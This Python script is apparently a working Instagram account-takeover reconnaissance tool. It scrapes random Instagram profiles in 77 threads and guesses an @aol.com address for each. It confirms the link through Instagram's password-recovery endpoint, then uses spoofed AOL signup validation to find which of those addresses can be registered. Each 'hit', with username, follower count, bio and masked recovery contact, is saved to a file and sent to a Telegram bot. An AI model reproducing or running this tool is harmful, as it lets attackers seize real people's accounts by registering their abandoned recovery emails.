import os
import sys
import re
import json
import string
import random
import hashlib
import secrets
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
import httpx
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init



from datetime import datetime
import sys

expiry_date = datetime(2028,4,1)

current_time = datetime.now()

if current_time > expiry_date:
    print("""

        ⛔ 𝓔𝔁𝓹𝓲𝓻𝓮𝓭 ⛔

🌸 your access has ended...
💌 file chahiye? dm karo 💕

🎀 @LEEEUNJUU
""")
    sys.exit()

print("""

🌸 system active...
💖 enjoy your session 💕
""")



INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
Sofiyan_domain = '@aol.com' 


E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32f' 
A = '\033[2;34m'
C = '\033[2;35c' 
S = '\033[2;36m'
G = '\033[1;34m' 
HH = '\033[1;34m' 
O = '\x1b[38;5;208m'
Y = '\033[1;34m'
C = '\033[2;35c'
M = '\x1b[1;37m'


total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

header = render('LEE EUN JU', colors=['white', 'red'], align='center')

print(header)


ID = input(" ID DE : ")
TOKEN = input(" Token De :  ")
    
os.system('clear')
print("\x1b[1;36m—" * 67)
print("\x1b[1;36m—" * 67)

os.system('clear')

def pppp():
    ge = hits               
    bt = bad_insta + bad_email 
    be = good_ig          
    print(f"\r          {B}  {C1}True : {M}{ge}  {E} Bad Aol: {M}{bt}  {W9}Good: {M}{be}    {R}|> \r", end='')

def update_stats():
    pppp()



_A = '@'
_U = '@aol.com'
_B = 'user-agent'
_C = 'content-type'
_E = 'accept'
_F = 'accept-language'
_G = '*/*'
_H = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
_I = 'spec.txt'
_J = 'cookie.txt'
_O = 'authority'
_P = 'origin'
_Q = 'referer'
_T = 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6'
_e = 'application/x-www-form-urlencoded; charset=UTF-8'


def Getaol():
    while True:
        try:
            qq = requests.get('https://login.aol.com/account/create', headers={_C: _e, _B: _H})
            cookies = qq.cookies.get_dict()
            tm1 = str(time.time()).split('.')[0]
            cookies.update({
                'gpp': 'DBAA',
                'gpp_sid': '-1',
                '__gads': f"ID=c0M0fd00676f0ea0:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA",
                '__gpi': f"UID=00000cf0e8904e90:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ",
                'cmp': f"t={tm1}&j=0&u=1---"
            })
            specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
            specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
            crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
            sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
            acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
            try:
                os.remove(_I)
                os.remove(_J)
            except:
                pass
            with open(_I, 'a') as t:
                t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
            with open(_J, 'a') as g:
                g.write(str(cookies) + '\n')
            break
        except Exception as e:
            time.sleep(5)


Getaol()


def check_aol(email):
    global hits, bad_email
    while True:
        try:
            if _A in email:
                name = email.split(_A)[0]
            else:
                name = email
            try:
                with open(_I, 'r') as f:
                    for line in f:
                        specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
                with open(_J, 'r') as f:
                    for line in f:
                        cookies = eval(line.strip())
            except:
                Getaol()
                with open(_I, 'r') as f:
                    for line in f:
                        specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
                with open(_J, 'r') as f:
                    for line in f:
                        cookies = eval(line.strip())
            headers = {
                _O: 'login.aol.com',
                _E: _G,
                _B: _H,
                _F: _T,
                _P: 'https://login.aol.com',
                _Q: f"https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com",
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                _C: _e,
                'x-requested-with': 'XMLHttpRequest'
            }
            params = {'validateField': 'userId'}
            data = f"browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup="
            res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
            if '{"errors":[]}' in res:
                hits += 1
                update_stats()
                if _A not in email:
                    ok = email + _U
                    username, gg = ok.split(_A)
                    InfoAcc(username, 'aol.com')
                else:
                    username, gg = email.split(_A)
                    InfoAcc(username, 'aol.com')
            else:
                bad_email += 1
                update_stats()
            break
        except Exception as e:
            break


def check(email):
    global good_ig, bad_insta
    try:
        headers = {
            "user-agent": generate_user_agent(),
            "x-ig-app-id": "936619743392459",
            "x-requested-with": "XMLHttpRequest",
            "x-instagram-ajax": "1032099486",
            "x-csrftoken": "missing",
            "x-asbd-id": "359341",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "accept-language": "en-US",
            "priority": "u=1, i",
        }

        r = httpx.Client(http2=True, headers=headers, timeout=20).post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", 
            data={"email_or_username": email}
        )
        
        response_text = r.text
        
        if email in response_text or '"status":"ok"' in response_text:
            
            check_aol(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    except Exception:
        bad_insta += 1
        update_stats()


def rest(user):
    try:
        headers = {
            "user-agent": generate_user_agent(),
            "x-ig-app-id": "936619743392459",
            "x-requested-with": "XMLHttpRequest",
            "x-instagram-ajax": "1032099486",
            "x-csrftoken": "missing",
            "x-asbd-id": "359341",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "accept-language": "en-US",
            "priority": "u=1, i",
        }

        r = httpx.Client(http2=True, headers=headers, timeout=20).post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", 
            data={"email_or_username": user}
        )
        
        response = r.json()
        return response.get('contact_point', 'Email bulunamadı')
    except Exception as e:
        return f'Hata: {str(e)}'


def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass


def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    bio = account_info.get('biography')
    meta_status = "meta  ✅" if followers > 99 else "meta✖️"
    total_hits += 1
    info_text = f"""

╭━━━🎀   💗 𝐋𝐄𝐄 𝐄𝐔𝐍 𝐉𝐔 💗   🎀━━━╮

      🧁 𝓗𝓲𝓽𝓼 : {total_hits} 🧁

  🐰 𝓤𝓼𝓮𝓻𝓷𝓪𝓶𝓮 : {username}
  💌 𝓔𝓶𝓪𝓲𝓵     : {username}@{domain}

  🌷 𝓕𝓸𝓵𝓵𝓸𝔀𝓮𝓻𝓼 : {followers} 🌷
  🎀 𝓕𝓸𝓵𝓵𝓸𝔀𝓲𝓷𝓰 : {following} 🎀
  📸 𝓟𝓸𝓼𝓽𝓼     : {posts} 📸

  🫧 𝓑𝓲𝓸       : {bio}
  🧸 𝓐𝓒𝓒 𝓘𝓓   : {user_id}

  🔄 𝓡𝓮𝓼𝓮𝓽     : {rest(username)}

  🌐 𝓛𝓲𝓷𝓴 :
  💖 https://www.instagram.com/{username} 💖

      🍓 𝓡𝓮𝓰 : 2012 🍓

╰━━━🌸💗  @LEEEUNJUU  💗🌸━━━╯

"""
    with open('Aolfileshits.txt', 'a') as f:
        f.write(info_text + "\n")
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass


def Sofiyan_python():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(17750000,279760000)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < 0:
                    continue
                infoinsta[username] = account
                emails = [username + Sofiyan_domain]
                for email in emails:
                    check(email)
        except Exception:
            pass


def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()

for _ in range(77):
    Thread(target=Sofiyan_python).start()